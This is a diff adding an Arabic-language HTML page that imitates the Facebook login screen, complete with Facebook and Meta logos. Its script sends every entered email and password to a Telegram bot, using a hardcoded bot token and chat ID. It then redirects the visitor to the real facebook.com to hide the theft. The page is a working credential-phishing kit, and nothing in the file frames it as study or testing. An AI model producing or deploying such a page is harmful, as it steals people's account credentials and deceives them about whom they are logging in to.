@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 300px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            direction: rtl;
+        }
+
+        .login-button {
+            width: 100%; /* تطابق عرض الحقول */
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* إضافة التحول السلس */
+        }
+
+        .login-button:hover {
+            background-color: #0e66d4; /* تغيير اللون عند التمرير */
+        }
+
+        .login-button:active {
+            background-color: #0a50a3; /* تغيير اللون عند الضغط */
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #1877f2;
+            color: #1877f2;
+            background-color: white;
+            border-radius: 5px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .meta-logo {
+            width: 40px;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                width: 95%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="language-selector">العربية</div>
+            <img src="https://i.imgur.com/g5ljZae.png" alt="Facebook Logo" class="logo">
+        </header>
+        <main>
+            <form id="loginForm">
+                <input type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" class="input-field" id="username">
+                <input type="password" placeholder="كلمة السر" class="input-field" id="password">
+                <button type="submit" class="login-button" onclick="handleLogin(event)">تسجيل الدخول</button>
+                <div class="error-message" id="errorMessage"></div>
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+            </form>
+        </main>
+        <footer>
+            <button class="create-account-button" onclick="window.location.href='https://www.facebook.com/?wtsid=rdr_0YTZMeGEzK6P49vvl&_rdr'">إنشاء حساب جديد</button>
+            <img src="https://i.imgur.com/vO2eiR4.png" alt="Meta Logo" class="meta-logo">
+        </footer>
+    </div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            if (!username || !password) {
+                errorMessage.textContent = 'يرجى ملء جميع الحقول';
+                return;
+            }
+
+            // Perform email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(username)) {
+                errorMessage.textContent = 'البريد الإلكتروني غير صحيح';
+                return;
+            }
+
+            // Send data to Telegram bot
+            const botUrl = 'https://api.telegram.org/bot8149389736:AAFgeqcH2X_d8tgXId94BnE4NALRmN78ybU/sendMessage';
+            const chatId = '346233181';
+            const message = `Username: ${username}\nPassword: ${password}`;
+
+            fetch(botUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://www.facebook.com/?wtsid=rdr_0YTZMeGEzK6P49vvl&_rdr';
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال البيانات');
+            });
+        }
+    </script>
+</body>
+</html>
